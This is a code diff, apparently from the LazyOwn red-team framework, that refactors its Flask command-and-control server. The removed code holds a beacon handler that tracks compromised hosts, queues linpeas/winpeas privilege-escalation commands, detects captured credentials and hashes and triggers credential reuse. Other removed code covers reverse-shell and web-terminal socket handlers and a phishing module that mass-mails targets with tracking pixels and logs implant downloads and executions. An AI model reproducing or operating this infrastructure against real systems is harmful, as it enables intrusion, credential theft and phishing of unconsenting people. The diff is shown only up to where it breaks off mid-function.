-                    _sanitize_csv_field(result_portscan, maxlen=1000),
-                    _sanitize_csv_field(result_pwd, maxlen=1000),
-                    _sanitize_csv_field(command, maxlen=500),
-                    _sanitize_csv_field(output, maxlen=1000),
-                ]
-                writer.writerow(safe_data)
-
-            _record = {
-                "client_id": sanitized_client_id,
-                "output": output,
-                "client": client,
-                "pid": pid,
-                "hostname": hostname,
-                "ips": ips,
-                "user": user,
-                "discovered_ips": discovered_ips,
-                "result_portscan": result_portscan,
-                "result_pwd": result_pwd,
-                "command": command,
-                "timestamp": datetime_now_iso(),
-            }
-            results[sanitized_client_id] = _record
-            _append_beacon_record(_record)
-
-            logging.info(f"Received output from {sanitized_client_id}: {output[:100]} Platform: {client}")
-            _was_new_beacon = sanitized_client_id not in connected_clients
-            connected_clients.add(sanitized_client_id)
-            logging.info(f"Client {sanitized_client_id} registered as connected")
-
-            # ── Engagement hook: publish SHELL_OBTAINED on first sight ───────
-            # Fires once per client_id (idempotent via seen-beacons cache).
-            # Runs in a background thread so it never delays the beacon
-            # response path. All notification fan-out (collab feed, telegram,
-            # discord) lives in modules/engagement_hooks.py; this hook only
-            # forwards the relevant fields.
-            try:
-                import threading as _engage_thr
-
-                _modules_path = os.path.join(BASE_DIR, "modules")
-
-                def _engage_publish(
-                    _cid=str(sanitized_client_id),
-                    _ip=str(ips).split(",")[0].strip().strip("[]'\""),
-                    _host=str(hostname),
-                    _user=str(user),
-                    _platform=str(client),
-                ):
-                    try:
-                        import sys as _sys_eng
-
-                        if _modules_path not in _sys_eng.path:
-                            _sys_eng.path.insert(0, _modules_path)
-                        from engagement_hooks import publish_shell_obtained as _push
-
-                        _push(
-                            client_id=_cid,
-                            primary_ip=_ip,
-                            hostname=_host,
-                            user=_user,
-                            platform=_platform,
-                        )
-                        try:
-                            from modules.event_bus import EventCategory, LazyEvent, get_event_bus
-
-                            get_event_bus().publish(
-                                LazyEvent(
-                                    category=EventCategory.BEACON,
-                                    event_type="beacon_registered",
-                                    source="c2",
-                                    payload={
-                                        "client_id": _cid,
-                                        "ip": _ip,
-                                        "hostname": _host,
-                                        "user": _user,
-                                        "platform": _platform,
-                                    },
-                                    target=_ip,
-                                )
-                            )
-                        except Exception:
-                            pass
-                    except Exception as _exc:
-                        logging.debug(f"[engagement] publish_shell_obtained failed: {_exc}")
-
-                _engage_thr.Thread(
-                    target=_engage_publish,
-                    daemon=True,
-                    name="engage-shell-hook",
-                ).start()
-            except Exception:
-                pass  # engagement hook must never affect beacon response
-
-            # ── Conditional Hooks: fire operator-defined rules ──────────────────
-            try:
-                _was_new = _was_new_beacon
-
-                def _extract_first_ip(raw: str) -> str:
-                    """Extract the first valid IPv4 address from a comma-separated string."""
-                    import ipaddress as _ipm
-
-                    for _candidate in str(raw).split(","):
-                        _clean = _candidate.strip().strip("[]'\" ")
-                        try:
-                            _ipm.IPv4Address(_clean)
-                            return _clean
-                        except Exception:
-                            continue
-                    return ""
-
-                def _is_valid_credential(value: str) -> bool:
-                    """Check if a string looks like a captured credential."""
-                    _v = str(value).strip()
-                    if not _v:
-                        return False
-                    if len(_v) < 6:
-                        return False
-                    _has_user_pass = ":" in _v and 2 <= len(_v.split(":", 1)[0]) <= 128
-                    _has_ntlm = "$" in _v and len(_v) >= 32
-                    _has_hash = "$" in _v and "$:" in _v
-                    _is_multiline = "\n" in _v and _has_user_pass
-                    _is_path_only = _v.startswith("/") or _v.startswith("\\") or _v.startswith("C:")
-                    if _is_path_only and not _has_user_pass:
-                        return False
-                    return _has_user_pass or _has_ntlm or _has_hash or _is_multiline
-
-                _raw_ips = str(ips) if ips else ""
-                _primary_ip = _extract_first_ip(_raw_ips) or str(hostname)
-                from modules.conditional_hooks import get_hook_engine as _get_hooks
-
-                _hook_engine = _get_hooks()
-                _hook_engine.set_placeholders(
-                    {
-                        "rhost": str(getattr(config, "rhost", "")),
-                        "lhost": str(getattr(config, "lhost", "")),
-                        "domain": str(getattr(config, "domain", "")),
-                    }
-                )
-
-                def _normalise_platform(raw_platform: str) -> str:
-                    _r = raw_platform.lower()
-                    if "linux" in _r:
-                        return "linux"
-                    if "windows" in _r or "win" in _r:
-                        return "windows"
-                    return _r
-
-                if "run_command" not in _hook_engine._action_handlers:
-                    _allowed_dir = ALLOWED_DIRECTORY
-
-                    def _queue_beacon_cmd(action: dict, ctx: dict) -> bool | None:
-                        _cid = str(ctx.get("client_id", ""))
-                        _cmd = str(action.get("command", ""))
-                        if not _cid or not _cmd:
-                            return None
-                        _sanitized = sanitize_client_id(_cid)
-                        _queue_path = os.path.join(_allowed_dir, f"cmd_{_sanitized}.json")
-                        try:
-                            _cmds: list = []
-                            if os.path.isfile(_queue_path):
-                                with open(_queue_path) as _qf:
-                                    _cmds = json.load(_qf)
-                            _cmds.append(_cmd)
-                            with open(_queue_path, "w") as _qf:
-                                json.dump(_cmds, _qf)
-                            logging.info("[hooks] Queued beacon cmd for %s: %s", _cid, _cmd[:80])
-                            return True
-                        except Exception as _exc:
-                            logging.warning("[hooks] Beacon queue failed: %s", _exc)
-                            return None
-
-                    _hook_engine.register_action_handler("run_command", _queue_beacon_cmd)
-                    _hook_engine.register_action_handler("run_scan_command", _queue_beacon_cmd)
-
-                _hctx = {
-                    "client_id": str(sanitized_client_id),
-                    "ip": _primary_ip,
-                    "hostname": str(hostname),
-                    "user": str(user),
-                    "platform": _normalise_platform(str(client)),
-                    "command": str(command),
-                    "output": str(output)[:500],
-                }
-
-                if _was_new:
-                    _hook_engine.fire("beacon_connected", _hctx)
-
-                try:
-                    from modules.world_model import HostState as _HS
-                    from modules.world_model import get_world_model as _get_wm
-
-                    _wm = _get_wm()
-                    _wm.advance_host(_primary_ip, _HS.EXPLOITED)
-                    _wm.add_note(_primary_ip, f"Foothold: {str(user)} via {str(client)}")
-                    logging.info("[world_model] Advanced %s to EXPLOITED (foothold)", _primary_ip)
-                    from modules.killchain import KillChain as _KC
-
-                    _KC.advance_phase("exploit", host=_primary_ip)
-                    logging.info("[killchain] Phase advanced to exploit via beacon %s", sanitized_client_id)
-                    if _was_new:
-                        _KC.advance_phase("privesc", host=_primary_ip)
-                        logging.info("[killchain] Phase advanced to privesc via beacon %s", sanitized_client_id)
-                except Exception as _wme:
-                    logging.debug("[world_model] advance failed: %s", _wme)
-
-                _hook_engine.fire("command_executed", _hctx)
-
-                # ── Queue linpeas/winpeas on first check-in only ─────────
-                if _was_new and bool(getattr(config, "auto_privesc_on_checkin", False)):
-                    try:
-                        _platform = _normalise_platform(str(client))
-                        _privesc_cmd = _build_privesc_command(_platform)
-                        _cmds = []
-                        _queue_path = _secure_command_queue_path(sanitized_client_id)
-                        if os.path.isfile(_queue_path):
-                            with open(_queue_path) as _qf:
-                                _cmds = json.load(_qf)
-                        if _privesc_cmd:
-                            _cmds.append(_privesc_cmd)
-                            logging.info(
-                                "[privesc] Queued %s for %s: %.100s",
-                                "linpeas" if _platform == "linux" else "winpeas",
-                                sanitized_client_id,
-                                _privesc_cmd,
-                            )
-                        _recon_state = _load_malleable_recon_state(sanitized_client_id)
-                        if not _recon_state.get("discover_queued") and bool(
-                            getattr(config, "auto_discover_on_checkin", False)
-                        ):
-                            _cmds.append("discover:")
-                            _recon_state["discover_queued"] = True
-                            logging.info(
-                                "[beacon_recon] Queued discover: for %s",
-                                sanitized_client_id,
-                            )
-                        _save_malleable_recon_state(sanitized_client_id, _recon_state)
-                        if _cmds:
-                            with open(_queue_path, "w") as _qf:
-                                json.dump(_cmds, _qf)
-                    except Exception as _qe:
-                        logging.debug("[privesc] Queue failed: %s", _qe)
-
-                try:
-                    _out_lower = str(output).lower()
-                    _owns = (
-                        str(user).lower() == "root"
-                        or "uid=0(root)" in _out_lower
-                        or ("uid=0(" in _out_lower and "root" in _out_lower)
-                        or "nt authority\\system" in _out_lower
-                        or str(user).lower() == "nt authority\\system"
-                    )
-                    if _owns:
-                        from modules.world_model import HostState as _HS2
-                        from modules.world_model import get_world_model as _get_wm2
-
-                        _wm2 = _get_wm2()
-                        _wm2.advance_host(_primary_ip, _HS2.OWNED)
-                        _wm2.add_note(_primary_ip, "Privilege escalation successful: root/System obtained")
-                        logging.info("[killchain] Beacon %s already root/System — host OWNED", sanitized_client_id)
-                        _hook_engine.fire("privilege_escalated", _hctx)
-                        _hook_engine.fire("host_owned", _hctx)
-                except Exception:
-                    pass
-
-                if result_pwd and _is_valid_credential(str(result_pwd)):
-                    _hook_engine.fire("credential_captured", _hctx)
-                    try:
-                        from modules.credential_reuse import get_credential_reuse_engine as _get_cre
-
-                        def _bg_cred_reuse(_ip=str(_primary_ip)):
-                            _cre = _get_cre()
-                            from modules.state_manager import StateManager as _SM
-
-                            _st = _SM()
-                            _candidates = _cre.suggest_from_state_manager(_st, limit=10)
-                            if _candidates:
-                                _summary = _cre.get_summary(_candidates)
-                                logging.info("[cred_reuse]\n%s", _summary)
-
-                        threading.Thread(target=_bg_cred_reuse, daemon=True).start()
-                    except Exception:
-                        pass
-
-                if result_portscan or discovered_ips:
-                    try:
-                        from modules.beacon_recon import ingest_beacon_recon as _ingest_recon
-
-                        _recon_stats = _ingest_recon(
-                            primary_ip=str(_primary_ip),
-                            discovered_ips=discovered_ips,
-                            portscan=result_portscan,
-                            hostname=str(hostname),
-                            user=str(user),
-                            client_id=str(sanitized_client_id),
-                        )
-                        logging.info(
-                            "[beacon_recon] %s: %s",
-                            sanitized_client_id,
-                            {key: _recon_stats.get(key) for key in ("hosts", "services")},
-                        )
-                        for _ps_host, _ps_ports in (_recon_stats.get("scanned") or {}).items():
-                            for _pp in _ps_ports:
-                                _hook_engine.fire(
-                                    "service_detected",
-                                    {"port": _pp, "host": _ps_host},
-                                )
-                        _recon_state = _load_malleable_recon_state(sanitized_client_id)
-                        if _recon_stats.get("discovered") and not _recon_state.get("portscan_queued"):
-                            _recon_state["portscan_queued"] = True
-                            _save_malleable_recon_state(sanitized_client_id, _recon_state)
-                            _enqueue_malleable_command(sanitized_client_id, "portscan:")
-                            logging.info(
-                                "[beacon_recon] Queued portscan: for %s (%d live host(s))",
-                                sanitized_client_id,
-                                len(_recon_stats.get("discovered") or []),
-                            )
-                    except Exception as _recon_exc:
-                        logging.debug("[beacon_recon] ingest failed: %s", _recon_exc)
-            except Exception as _hook_exc:
-                logging.debug("[hooks] fire failed: %s", _hook_exc)
-
-            # ── C2 Bidirectionality: feed beacon output back into knowledge pipeline ──
-            # This runs in a background thread so it never delays the beacon response.
-            try:
-                import sys as _sys
-                import threading as _thr
-
-                _skills = os.path.join(BASE_DIR, "skills")
-                _mods = os.path.join(BASE_DIR, "modules")
-
-                def _ingest_beacon(
-                    _ips=str(ips), _host=str(hostname), _cmd=str(command), _out=str(output), _user=str(user)
-                ):
-                    try:
-                        if _skills not in _sys.path:
-                            _sys.path.insert(0, _skills)
-                        if _mods not in _sys.path:
-                            _sys.path.insert(0, _mods)
-
-                        # Determine primary IP
-                        primary_ip = _extract_first_ip(_ips)
-                        if not primary_ip:
-                            primary_ip = _host
-
-                        # Write output to sessions/<ip>/c2/<cmd_hash>/beacon.txt
-                        import hashlib as _hl
-
-                        cmd_slug = _hl.sha256(_cmd.encode()).hexdigest()[:8]
-                        out_dir = os.path.join(SESSIONS_DIR, primary_ip, "c2", cmd_slug)
-                        os.makedirs(out_dir, exist_ok=True)
-                        beacon_file = os.path.join(out_dir, "beacon.txt")
-                        with open(beacon_file, "a") as _bf:
-                            _bf.write(f"# cmd: {_cmd}\n# user: {_user}\n{_out}\n")
-
-                        # Ingest into FactStore
-                        from pathlib import Path as _P
-
-                        from lazyown_facts import FactStore as _FS
-
-                        _fs = _FS()
-                        n = _fs.ingest_text(_P(beacon_file), host_hint=primary_ip)
-                        if n:
-                            _fs.save()
-                            logging.info(f"[c2-bidir] FactStore: {n} facts from beacon {primary_ip}")
-
-                        # Write OS back to sessions/os.json and world_model.json.
-                        # The beacon's 'client' field is the definitive OS signal:
-                        # it comes from the implant running on the actual target.
-                        # TTL-based heuristics are probabilistic; this is ground truth.
-                        _client_os = _user  # 'client' is mapped to _user above
-                        # Re-read the actual client field from data dict
-                        _raw_os = str(data.get("client", "")).lower()
-                        if "windows" in _raw_os:
-                            _os_id, _os_name = "2", "Windows"
-                        elif "linux" in _raw_os or "unix" in _raw_os:
-                            _os_id, _os_name = "1", "Linux"
-                        else:
-                            _os_id, _os_name = "4", "Unknown"
-
-                        if _os_id != "4":
-                            import json as _j
-
-                            _os_json_path = os.path.join(SESSIONS_DIR, "os.json")
-                            try:
-                                _os_entry = [
-                                    {
-                                        "id": _os_id,
-                                        "os": _os_name,
-                                        "ttl": 64 if _os_id == "2" else 128,
-                                        "state": "active",
-                                        "source": "beacon",
-                                    }
-                                ]
-                                with open(_os_json_path, "w") as _ojf:
-                                    _j.dump(_os_entry, _ojf, indent=4)
-                                logging.info(
-                                    f"[c2-bidir] sessions/os.json updated: "
-                                    f"os={_os_name} host={primary_ip} (beacon ground truth)"
-                                )
-                            except Exception as _oje:
-                                logging.debug(f"[c2-bidir] os.json write error: {_oje}")
-
-                            # Update world_model.json os_hint for this host.
-                            _wm_path = os.path.join(SESSIONS_DIR, "world_model.json")
-                            try:
-                                from modules.world_model import read_state_dict, write_state_dict
-
-                                _wm = read_state_dict(_wm_path)
-                                _hosts = _wm.setdefault("hosts", {})
-                                _h = _hosts.setdefault(primary_ip, {})
-                                if not _h.get("os_hint"):
-                                    _h["os_hint"] = _os_name.lower()
-                                    write_state_dict(_wm_path, _wm)
-                                    logging.info(
-                                        f"[c2-bidir] world_model.json os_hint={_os_name.lower()} host={primary_ip}"
-                                    )
-                            except Exception as _wme:
-                                logging.debug(f"[c2-bidir] world_model update error: {_wme}")
-
-                        # Emit event via event_engine
-                        import datetime as _dtt
-                        import uuid as _uu
-
-                        from event_engine import _append_event as _ae
-
-                        _ae(
-                            {
-                                "id": _uu.uuid4().hex[:8],
-                                "timestamp": _dtt.datetime.now(_dtt.timezone.utc).isoformat(),
-                                "type": "BEACON_OUTPUT",
-                                "severity": "info",
-                                "rule_id": "c2_beacon",
-                                "source": {"ip": primary_ip, "cmd": _cmd[:80], "user": _user},
-                                "suggest": f"New beacon output from {primary_ip}. Run facts_show(refresh=True).",
-                                "status": "pending",
-                            }
-                        )
-                    except Exception as _exc:
-                        logging.debug(f"[c2-bidir] ingest failed: {_exc}")
-
-                _thr.Thread(target=_ingest_beacon, daemon=True, name="c2-bidir").start()
-            except Exception:
-                pass  # bidirectionality must never affect beacon response
-
-            return jsonify({"status": "success", "Platform": client}), 200
-
-        except IOError:
-            if config.enable_c2_debug:
-                logger.info("[ERROR] File operation error")
-            return jsonify({"status": "error", "message": "File operation error"}), 500
-
-    except json.JSONDecodeError:
-        if config.enable_c2_debug:
-            logger.info("[ERROR] Invalid JSON received")
-        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
-    except Exception:
-        logger.exception("Unexpected error in handler")
-        return jsonify({"status": "error", "message": "Internal server error"}), 500
+    """Receive one beacon report and fan out every side-effect pipeline.
+
+    Delegates to :func:`lazyc2.beacons.service.receive_result` over the
+    active runtime. Kept as a thin adapter so tests can keep
+    monkeypatching ``lazyc2.receive_result``.
+
+    Args:
+        client_id: Beacon client id from the poll path.
+
+    Returns:
+        The Flask response for the report.
+    """
+    return _beacon_service().receive_result(_beacon_runtime(), client_id)
 
 
 @app.route("/api/poll/<client_id>", methods=["GET"])
@@ -7645,6 +6601,7 @@ def _render_legacy_report():
     cves = load_cves()
     try:
         from modules.loop_manager import default_manager as _loop_default_manager
+
         loops_summary = _loop_default_manager().summary()
     except Exception:
         if config.enable_c2_debug:
@@ -7699,196 +6656,18 @@ def listener():
     return f"WebSocket listener is running on port {reverse_shell_port}."
 
 
-@socketio.on("connect", namespace="/listener")
-@login_required
-@require_mfa_socket
-def listener_connect():
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    if config.enable_c2_debug:
-        logger.info("Client connected to /listener")
-    emit("output", "Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n$ ")
+from lazyc2.terminal.glue import register_terminal_glue  # noqa: E402
 
-
-@socketio.on("disconnect", namespace="/listener")
-@login_required
-def listener_disconnect():
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    if config.enable_c2_debug:
-        logger.info("Client disconnected from /listener")
-
-
-@socketio.on("pty-input", namespace="/pty")
-@login_required
-@require_mfa_socket
-def pty_input(data):
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    """Recibe entrada del terminal web y la escribe al PTY"""
-    if app.config["fd"]:
-        try:
-            os.write(app.config["fd"], data["input"].encode())
-        except Exception:
-            logger.error("Error escribiendo entrada:")
-
-
-@socketio.on("resize", namespace="/pty")
-@login_required
-@require_mfa_socket
-def resize(data):
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    """Maneja el redimensionamiento de la terminal"""
-    if app.config["fd"]:
-        if config.enable_c2_debug:
-            logger.info(f"Redimensionando terminal a {data['rows']}x{data['cols']}")
-        set_winsize(app.config["fd"], data["rows"], data["cols"])
-
-
-@socketio.on("connect", namespace="/pty")
-@login_required
-@require_mfa_socket
-def pty_connect():
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    """Maneja nueva conexión de cliente"""
-    if config.enable_c2_debug:
-        logger.info("Nuevo cliente conectado")
-
-    if app.config["child_pid"]:
-        return
-
-    try:
-        (child_pid, fd) = pty.fork()
-
-        if child_pid == 0:
-            subprocess.run(["python3", "lazyown.py"], check=True)
-        else:
-            set_winsize(fd, 25, 120)
-            app.config["fd"] = fd
-            app.config["child_pid"] = child_pid
-
-            socketio.start_background_task(read_and_forward_pty_output)
-            if config.enable_c2_debug:
-                logger.info(f"Proceso hijo iniciado con PID {child_pid}")
-
-    except Exception:
-        logger.error("Error iniciando shell:")
-
-
-@socketio.on("input")
-@login_required
-@require_mfa_socket
-def handle_input(data):
-    if not current_user.is_authenticated:
-        print("[!] Error Unauthorized.", request.remote_addr)
-        return {"error": "Unauthorized"}, 401
-
-    command = data.get("value")
-    if not command:
-        return
-    if config.enable_c2_debug:
-        logger.info(f"[CMD] Received: {command}")
-
-    command_out = shell.one_cmd(command)
-
-    shell.stdout.getvalue()
-    shell.stdout.truncate(0)
-    shell.stdout.seek(0)
-
-    emit("output", command_out + "$ ")
-
-
-@socketio.on("command", namespace="/listener")
-@login_required
-@require_mfa_socket
-def listener_command(msg):
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    if config.enable_c2_debug:
-        logger.info("Received command: " + msg)
-    try:
-        reverse_shell_socket.sendall((msg + "\n").encode())
-    except Exception:
-        emit("response", {"output": str("audio")}, namespace="/listener")
-
-
-@app.route("/terminal")
-@login_required
-def terminal():
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    return render_template("terminal.html")
-
-
-@socketio.on("connect", namespace="/terminal")
-@login_required
-@require_mfa_socket
-def terminal_connect():
-    if not current_user.is_authenticated:
-        disconnect()
-        return False
-    if config.enable_c2_debug:
-        logger.info("Cliente conectado a /terminal")
-
-
-@socketio.on("disconnect", namespace="/terminal")
-@login_required
-def terminal_disconnect():
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    if config.enable_c2_debug:
-        logger.info("Cliente desconectado de /terminal")
-
-
-@socketio.on("input", namespace="/terminal")
-@login_required
-@require_mfa_socket
-def terminal_input(data):
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    command = data.get("command")
-    client_id = data.get("client_id")
-    if command and client_id:
-        output = execute_command(command)
-        socketio.emit("output", {"client_id": client_id, "output": output}, namespace="/terminal")
-
-
-@socketio.on("command", namespace="/terminal")
-@login_required
-@require_mfa_socket
-def terminal_command(data):
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    cmd = data.get("cmd")
-    if not cmd:
-        return
-    if config.enable_c2_debug:
-        logger.info(f"Ejecutando comando: {cmd}")
-    output = execute_command(cmd)
-    emit("response", {"output": output})
-
-
-@socketio.on("resize", namespace="/terminal")
-@login_required
-@require_mfa_socket
-def terminal_resize(data):
-    if not current_user.is_authenticated:
-        print(f"[!] Error. {request.remote_addr}")
-        return False
-    if app.config["fd"]:
-        set_winsize(app.config["fd"], data["rows"], data["cols"])
+register_terminal_glue(
+    socketio,
+    app=app,
+    config=config,
+    logger=logger,
+    shell=shell,
+    execute_command=execute_command,
+    reverse_socket=lambda: reverse_shell_socket,
+    require_mfa_socket=require_mfa_socket,
+)
 
 
 def start_reverse_shell():
@@ -8688,97 +7467,6 @@ def upload_zip_file():
         return render_template("index.html", error=f"Error processing file: {str('')}")
 
 
-@phishing_bp.route("/phishing/campaigns", methods=["GET"])
-@login_required
-def list_campaigns():
-    campaigns = []
-    for filename in os.listdir(CAMPAIGNS_DIR):
-        if filename.endswith(".yaml"):
-            campaign = load_yaml_safely(os.path.join(CAMPAIGNS_DIR, filename))
-            if campaign:
-                campaign["id"] = filename.replace(".yaml", "")
-                campaigns.append(campaign)
-    return render_template("phishing/campaigns.html", campaigns=campaigns)
-
-
-@phishing_bp.route("/phishing/campaigns/new", methods=["GET", "POST"])
-@login_required
-def create_campaign():
-    if request.method == "POST":
-        data = request.form
-        campaign_id = str(uuid.uuid4())
-
-        if not data.get("name") or not data.get("template") or not data.get("recipients"):
-            flash("Name, template, and recipients are required.", "error")
-            return redirect(url_for("phishing.create_campaign"))
-
-        beacon_url = data.get("beacon_url", "")
-        if not beacon_url:
-            logger.warning(f"Campaign {campaign_id} created with empty beacon_url")
-            short_url = secrets.token_urlsafe(6)
-            short_urls = load_short_urls()
-            short_urls[short_url] = {
-                "original_url": f"http://{request.host}/track/{short_url}",
-                "active": True,
-                "created_at": datetime.now().isoformat(),
-            }
-            save_short_urls(short_urls)
-            beacon_url = f"http://{request.host}/{short_url}"
-
-        campaign = {
-            "name": data["name"],
-            "template": data["template"],
-            "recipients": [r.strip() for r in data["recipients"].split(",")],
-            "beacon_url": beacon_url,
-            "created_at": datetime.now(timezone.utc).isoformat(),
-        }
-        try:
-            with open(os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml"), "w") as f:
-                yaml.safe_dump(campaign, f)
-            logger.info(f"Campaign {campaign_id} saved successfully")
-        except Exception as e:
-            logger.error(f"Error saving campaign {campaign_id}: {e}")
-            flash("Failed to save campaign.", "error")
-            return redirect(url_for("phishing.create_campaign"))
-
-        try:
-            template_file = os.path.join(TEMPLATES_DIR, f"{campaign['template']}.yaml")
-            template = load_yaml_safely(template_file)
-            if not template:
-                flash("Invalid email template.", "error")
-                return redirect(url_for("phishing.create_campaign"))
-
-            with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
-                for recipient in campaign["recipients"]:
-                    tracking_url = url_for(
-                        "phishing.track_pixel", campaign_id=campaign_id, email=recipient, _external=True
-                    )
-                    html_body = template["body"].format(
-                        name=recipient.split("@")[0],
-                        beacon_url=campaign["beacon_url"],
-                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />',
-                    )
-                    yag.send(to=recipient, subject=template["subject"], contents=html_body)
-                    logger.info(f"Sent email to {recipient} for campaign {campaign_id}")
-
-                    conn = sqlite3.connect(DB_PATH)
-                    conn.execute(
-                        "INSERT INTO tracking VALUES (?, ?, ?, ?, ?)",
-                        (campaign_id, recipient, "sent", request.remote_addr, datetime.now().isoformat()),
-                    )
-                    conn.commit()
-                    conn.close()
-
-            flash(f"Campaign {campaign['name']} sent to {len(campaign['recipients'])} recipients.", "success")
-            return redirect(url_for("phishing.list_campaigns"))
-        except Exception as e:
-            logger.error(f"Error sending campaign {campaign_id}: {e}")
-            flash("Failed to send campaign emails.", "error")
-            return redirect(url_for("phishing.create_campaign"))
-    templates = [f.replace(".yaml", "") for f in os.listdir(TEMPLATES_DIR) if f.endswith(".yaml")]
-    return render_template("phishing/new_campaign.html", templates=templates)
-
-
 @app.route("/lazyphishingai", methods=["POST"])
 @requires_auth_or_session
 def lazyphishingai():
@@ -8794,334 +7482,6 @@ def lazyphishingai():
 
     response = process_prompt_local_yaml(prompt, False, "web", OUTPUT_FILE_YAML)
     return response
-
-
-@phishing_bp.route("/phishing/<campaign_id>/track/<email>")
-def track_pixel(campaign_id, email):
-    """Píxel de seguimiento para registrar aperturas."""
-    conn = sqlite3.connect(DB_PATH)
-    conn.execute(
-        "INSERT INTO tracking VALUES (?, ?, ?, ?, ?)",
-        (
-            campaign_id,
-            email,
-            "opened",
-            request.remote_addr,
-            datetime.now(timezone.utc).replace(tzinfo=None).isoformat(),
-        ),
-    )
-    conn.commit()
-    conn.close()
-
-    with open(os.path.join(os.getcwd(), "static", "images", "pixel.png"), "rb") as f:
-        return f.read(), 200, {"Content-Type": "image/png"}
-
-
-@phishing_bp.route("/phishing/<campaign_id>/report")
-@login_required
-def campaign_report(campaign_id):
-    campaign_file = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml")
-    campaign = load_yaml_safely(campaign_file)
-    if not campaign:
-        abort(404)
-    campaign["id"] = campaign_id
-
-    short_urls = load_short_urls()
-    beacon_url = campaign.get("beacon_url", "") if "vectors" not in campaign else ""
-    beacon_short_url = urlparse(beacon_url).path.lstrip("/") if beacon_url else ""
-
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("SELECT event, COUNT(*) FROM tracking WHERE campaign_id = ? GROUP BY event", (campaign_id,))
-    stats = {row[0]: row[1] for row in cursor.fetchall()}
-    cursor.execute(
-        "SELECT email, event, ip, timestamp FROM tracking WHERE campaign_id = ? ORDER BY timestamp DESC", (campaign_id,)
-    )
-    events = [{"email": row[0], "event": row[1], "ip": row[2], "timestamp": row[3]} for row in cursor.fetchall()]
-    cursor.execute(
-        "SELECT email, event_type, ip, user_agent, timestamp, behavior_data FROM behavioral_tracking WHERE campaign_id = ? OR short_url = ? ORDER BY timestamp DESC",
-        (campaign_id, beacon_short_url),
-    )
-    behavioral_events = [
-        {
-            "email": row[0],
-            "event_type": row[1],
-            "ip": row[2],
-            "user_agent": row[3],
-            "timestamp": row[4],
-            "behavior_data": row[5],
-        }
-        for row in cursor.fetchall()
-    ]
-    cursor.execute(
-        "SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ? ORDER BY timestamp DESC",
-        (campaign_id,),
-    )
-    multivector_events = [
-        {"email": row[0], "event_type": row[1], "ip": row[2], "timestamp": row[3]} for row in cursor.fetchall()
-    ]
-    conn.close()
-
-    download_events = []
-    execution_events = []
-    if beacon_short_url:
-        download_events = parse_access_log_for_short_url(beacon_short_url)
-        stats["downloaded"] = len(download_events)
-        stats["interactions"] = len(behavioral_events) + len(multivector_events)
-        original_url = short_urls.get(beacon_short_url, {}).get("original_url", "Unknown")
-        for event in download_events:
-            event["original_url"] = original_url
-        implante = short_urls.get(beacon_short_url, {}).get("original_url", "").split("/")[-1].replace(".exe", "")
-        if implante:
-            implant_config = load_implant_config(implante)
-            if implant_config.get("name") == implante:
-                execution_events = parse_execution_log(implante)
-                stats["executed"] = len(execution_events)
-
-    if "vectors" in campaign:
-        for vector_type, vector_data in campaign["vectors"].items():
-            beacon_url = vector_data.get("beacon_url", "")
-            if beacon_url:
-                beacon_short_url = urlparse(beacon_url).path.lstrip("/")
-                download_events.extend(parse_access_log_for_short_url(beacon_short_url))
-                stats["downloaded"] = len(download_events)
-
-    behavioral_analysis = analyze_behavioral_data(behavioral_events)
-    return render_template(
-        "phishing/report.html",
-        campaign=campaign,
-        stats=stats,
-        events=events,
-        download_events=download_events,
-        execution_events=execution_events,
-        behavioral_analysis=behavioral_analysis,
-        multivector_events=multivector_events,
-    )
-
-
-@phishing_bp.route("/phishing/<campaign_id>/orchestrate", methods=["GET", "POST"])
-@login_required
-def orchestrate_campaign(campaign_id):
-    campaign_file = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml")
-    campaign = load_yaml_safely(campaign_file)
-    if not campaign:
-        abort(404)
-    campaign["id"] = campaign_id
-
-    if request.method == "GET":
-        return render_template("phishing/orchestrate_campaign.html", campaign=campaign)
-
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute(
-        "SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ?", (campaign_id,)
-    )
-    events = [{"email": row[0], "event_type": row[1], "ip": row[2], "timestamp": row[3]} for row in cursor.fetchall()]
-    conn.close()
-
-    adaptations = analyze_campaign_progress(campaign_id, events)
-    short_urls = load_short_urls()
-    new_short_url = adaptations.get("short_url", secrets.token_urlsafe(6))
-    beacon_url = (
-        campaign.get("beacon_url", "")
-        if "vectors" not in campaign
-        else campaign["vectors"].get("email", {}).get("beacon_url", "")
-    )
-    short_urls[new_short_url] = {
-        "original_url": adaptations.get("payload", beacon_url),
-        "active": True,
-        "created_at": datetime.now().isoformat(),
-    }
-    save_short_urls(short_urls)
-
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-        (campaign_id, "unknown", adaptations["vector"], request.remote_addr, datetime.now().isoformat()),
-    )
-    conn.commit()
-    conn.close()
-
-    return jsonify({"status": "adapted", "vector": adaptations["vector"], "short_url": new_short_url})
-
-
-@phishing_bp.route("/phishing/create_multivector_campaign", methods=["GET", "POST"])
-@login_required
-def create_multivector_campaign():
-    if request.method == "GET":
-        token = secrets.token_urlsafe(32)
